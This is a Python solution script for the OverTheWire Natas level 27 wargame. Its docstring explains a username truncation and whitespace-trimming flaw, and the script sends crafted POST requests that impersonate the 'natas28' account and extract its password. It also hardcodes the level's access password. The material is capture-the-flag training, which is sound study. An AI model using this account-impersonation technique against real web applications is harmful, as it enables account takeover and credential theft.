import re
import requests
''' Natas27
The key insight for this challenge is that the server side code is inconsistent
in how it handles whitespace and max lengths.
We'll exploit this by creating a user with a username of:
	"natas28" + 57 spaces + "x"  (the "x" can be any character)
This user will be considered a new user by `validUser` and will thus trigger
`createUser`. `createUser` checks whether there is extra whitespace at the end
of the username and will error out if there is. The "x" at the end of our
crafted username allows this check to bypass, but the "x" is not written
to the database because `createUser` trims the string to 64 characters long
to match the database field length.
As a result, when we use this username to login (with any passsword)
`validUser` will see it as a new user and trigger `createUser` which will
create a new user in the database with the username of "natas28" + 57 spaces.
As we discussed above the "x" we added is truncated by `createUser`.
Next we login using "natas28" + 57 spaces as the username and whatever password
you selected (in the code below we just omit the password entirely). `validUser`
and `checkCredentials` all work as expected treating us as an existing user.
Now the magic happens, when `dumpData` is called it trims the whitespace from the
end of our crafted username. This is the key inconsistency in the code which
enables our exploit. The resulting username is just "natas28" without any spaces
and as a result `dumpData` helpfully returns the password for
the actual "natas28" user.
'''



#the password for this challenge (natas27)
natas27_passwd = "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"


username = "natas28"


url = "http://natas27.natas.labs.overthewire.org/index.php"

# create a session object to persist cookies across requests
session = requests.Session()
session.auth = ("natas27", natas27_passwd)

# this is the crafted username which is exactly 65 characters long
new_user = username + " " * (64 - len(username)) + "x"

# make the initial request to create the user with the crafted username
response = session.post(url,data={"username": new_user, "password": ""},headers={"Content-Type": "application/x-www-form-urlencoded"},)


#at this point `createUser` has run and there is now a new user with our
#special username. Next we login as that user to exploit the inconsistent
#handling in `dumpData` and get the password.



new_user = username + " " * (64 - len(username))

response = session.post(url,data={"username": new_user, "password": ""},headers={"Content-Type": "application/x-www-form-urlencoded"},)

# extract the password from the response using regex
password_regex = r"\[password\] (=&gt;|=>) (?P<password>[a-zA-Z0-9]{32})"
password_match = re.search(password_regex, response.text)
password = password_match.group("password")

print(password)